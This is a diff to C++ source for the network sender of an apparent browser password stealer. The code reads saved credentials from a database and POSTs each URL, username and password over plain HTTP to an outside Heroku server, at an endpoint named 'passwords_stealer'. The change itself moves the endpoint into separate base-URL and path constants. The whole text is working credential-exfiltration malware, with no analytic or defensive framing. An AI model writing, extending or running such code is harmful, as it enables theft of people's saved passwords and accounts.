@@ -1,6 +1,7 @@
 #include "Sender.h"
 
-LPCWSTR Sender::apiUrl = L"passwords-server-984.herokuapp.com";
+LPCWSTR Sender::baseUrl = L"passwords-server-984.herokuapp.com";
+LPCWSTR Sender::apiPath = L"api/passwords_stealer/v1/insert";
 HINTERNET Sender::hConnect = NULL;
 
 void Sender::sendPasswords(string dbPath)
@@ -11,7 +12,7 @@ void Sender::sendPasswords(string dbPath)
 		cout << "Can't start http session";
 		exit(GetLastError());
 	}
-	Sender::hConnect = WinHttpConnect(hSession, apiUrl, INTERNET_DEFAULT_HTTP_PORT, 0);	//can't perfomr https requests yet
+	Sender::hConnect = WinHttpConnect(hSession, baseUrl, INTERNET_DEFAULT_HTTP_PORT, 0);	//can't perfomr https requests yet
 		if (!hConnect)
 	{
 		cout << "Can't establish a connection to the server";
@@ -56,7 +57,7 @@ int Sender::sqlCallback(void* notUsed, int argc, char** argv, char** azColName)
 
 int Sender::sendData(string url, string username, string passwords)
 {
-	HINTERNET hRequest = WinHttpOpenRequest(Sender::hConnect, L"POST", L"api/passwords_stealer/v1", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+	HINTERNET hRequest = WinHttpOpenRequest(Sender::hConnect, L"POST", Sender::apiPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 	if (!hRequest) return GetLastError();
 
 	string param = "url=" + url + "&username=" + username + "&password=" + passwords;
